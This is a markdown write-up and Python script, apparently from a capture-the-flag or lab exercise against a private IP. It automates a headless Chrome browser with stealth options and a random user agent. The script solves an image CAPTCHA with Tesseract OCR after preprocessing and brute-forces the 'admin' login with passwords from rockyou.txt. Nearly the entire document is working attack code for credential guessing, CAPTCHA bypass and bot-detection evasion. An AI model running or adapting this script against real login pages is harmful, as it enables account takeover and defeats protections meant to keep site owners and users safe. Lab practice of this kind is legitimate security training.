# CAPTCHA-BYPASS LOGIN BRUTE-FORCE (SELENIUM + OCR)

This script automates a browser via Selenium to attack a login form protected by an image CAPTCHA. It uses stealth/anti-detection options and a randomized user agent to look like a normal browser, screenshots the CAPTCHA image element, preprocesses it (grayscale, resize, sharpen, contrast, threshold) to improve OCR accuracy, then solves it with Tesseract before submitting each login attempt from a wordlist

---

For each password line from `rockyou.txt`: loads the page, OCR-solves the CAPTCHA image, fills username/password/captcha fields, submits, and checks the resulting page/URL for success vs. failure (retrying the same password on a wrong CAPTCHA read).

---
### Script:
```python
import time
import io
import os
import pytesseract
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"
machine_ip = 'MACHINE_IP'
rockyou_path = 'rockyou.txt'
username = 'admin'
rockyou_file = open(rockyou_path, "r")
login_url = f'http://10.82.176.171/'
options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')
chrome = webdriver.Chrome(options=options)
stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)
success = False
i = 0
password = rockyou_file.readline().strip()
while not success and i < 100:
	print(f"[-] Testing login with: {password} ({i+1} of 100)")
	chrome.get(login_url)
	time.sleep(0.5)
	captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
	captcha_png = captcha_img_element.screenshot_as_png
	image = Image.open(io.BytesIO(captcha_png)).convert("L")
	image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
	image = image.filter(ImageFilter.SHARPEN)
	image = ImageEnhance.Contrast(image).enhance(2.0)
	image = image.point(lambda x: 0 if x < 140 else 255, '1')
	captcha_text = pytesseract.image_to_string(
	    image,
	    config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
	).strip().replace(" ", "").replace("\n", "").upper()
	chrome.find_element(By.ID, "username").send_keys(username)
	chrome.find_element(By.ID, "password").send_keys(password)
	chrome.find_element(By.ID, "captcha_input").send_keys(captcha_text)
	chrome.find_element(By.ID, "login-btn").click()
	time.sleep(0.5)
  	# Check if we passed the CAPTCHA check
	if 'CAPTCHA incorrect.' in chrome.page_source:
		print("[-] Wrong captcha, retrying...")
		continue
  	# Check if we are redirected to the error page
	if 'error=true' not in chrome.current_url:
	    print(f"[+] Login successful with password: {password}")
	    print(f"[-] {chrome.current_url}")
	    break
	
	print(f"[-] Login failed")
	# Read next password
	password = rockyou_file.readline().strip()
	i += 1
```
